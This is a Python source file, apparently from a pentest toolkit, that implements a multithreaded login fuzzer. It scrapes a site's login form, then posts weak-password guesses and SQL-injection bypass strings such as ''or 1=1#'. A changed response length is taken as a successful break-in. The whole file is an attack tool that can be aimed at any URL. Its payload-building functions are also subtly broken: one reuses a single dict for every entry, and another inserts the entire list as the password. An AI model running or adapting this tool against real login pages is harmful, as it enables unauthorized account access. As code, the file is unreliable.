#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import requests
import os,re,sys,json
from concurrent.futures import ThreadPoolExecutor
from reports import reports
from bs4 import BeautifulSoup

weak_dict = ['123', '888', '@123', '666']  # 常用弱密码后缀
sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '\'OR 1=1%00']  # sql万能密码
payload = weak_dict+sql_pass
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
}

class Login:
    def __init__(self,url,file,threads,flag):
        self.url = url
        self.file = file
        self.threads = threads
        self.flag = flag
        self.start()

    def start(self):
        exp = []
        print('>>>>>Login_fuzz'+'-'*40)
        print('[ tips:有很多payload文件保存在./dict/login目录下 ]')
        args = self.get_args()
        if not args:
            return
        data = {}
        for x in args:
            if not args[x]:
                data[x] = input('请输入 {} 的值\n'.format(x))
            else:
                data[x] = args[x]
        print(data)
        exp = self.add_payload(data,payload)
        if self.file or self.flag:
            payloads = self.load_file(self.file)
            if payloads:
                print('[ payload导入完成 ]')
                exp += self.set_payload(data, payloads)
            else:
                print('[ payload导入失败 ]')
        # print(exp)
        report = self.run(exp)
        if report:
            reports.Report(report, self.url, 'login_report.txt', '网站密码fuzz报告已存放于', '没有探测出网站密码')
        else:
            print('[ 没有探测出网站密码 ]')
        print('-'*40+'Login_fuzz<<<<<')

    def get_args(self):
        '''
        获取表单元素和值
        :return:dict
        '''
        args = {}
        res = requests.get(self.url)
        soup = BeautifulSoup(res.content, 'html.parser')
        xxx = soup.find_all('input')
        for i in xxx:
            args[i.get('name')] = i.get('value')
        return args


    def load_file(self,file):
        '''
        加载指定payload
        :param file:
        :return:
        '''
        payload = []
        path = os.path.dirname(__file__)
        if file:
            try:
                F = open(file, 'r')
                for x in F:
                    payload.append(x.replace('\n', ''))
                return payload
            except:
                return

        else:
            file = 'password.txt'
            filepath = "{0}/{1}/{2}".format(path, r'../dict/login', file)
            F = open(filepath, 'r')
            for x in F:
                payload.append(x.replace('\n', ''))

        payload = list(set(payload))   # payload去重
        return payload


    def add_payload(self,data,payloads):
        '''
        拼接payload
        :param data:
        :param payloads:
        :return:
        '''
        exp = []
        pwd = list(data)[1]
        p_v = data[pwd]
        try:
            self.len = len(requests.post(self.url,data=data,headers=headers,timeout=5).content)   # 设置默认网站长度
        except:
            self.len = len(requests.post(self.url, data=data, headers=headers,
                                         timeout=20).content)  # 设置默认网站长度
        for x in payloads:
            data[pwd] = p_v + x    # 仅仅修改密码部分
            exp.append(data)
        return exp


    def set_payload(self,data,payloads):
        '''
        设置payload
        :param data: dict
        :param payloads: 弱密码集
        :return: data
        '''
        exp = []
        pwd = list(data)[1]

        for x in payloads:
            data[pwd] = payloads
            exp.append(data)
        return exp


    def run(self,exp):
        '''
        多线程跑fuzz
        :param exp:data集
        :return:报告
        '''
        report = []
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            results = pool.map(self.fuzz,exp)
            for result in results:
                if result['flag'] == 1:
                    print(result['msg'])
                    report.append(result['msg'])
        return report


    def fuzz(self,data):
        '''
        fuzz模块
        :param data:
        :return:
        '''
        try:
            res = requests.post(self.url,data=data,headers=headers,timeout=5).content
            if len(res) != self.len:
                msg = {'flag':1,'msg':data}
                return msg
            else:
                msg = {'flag': 0}
                return msg
        except:
            msg = {'flag':0}
            return msg

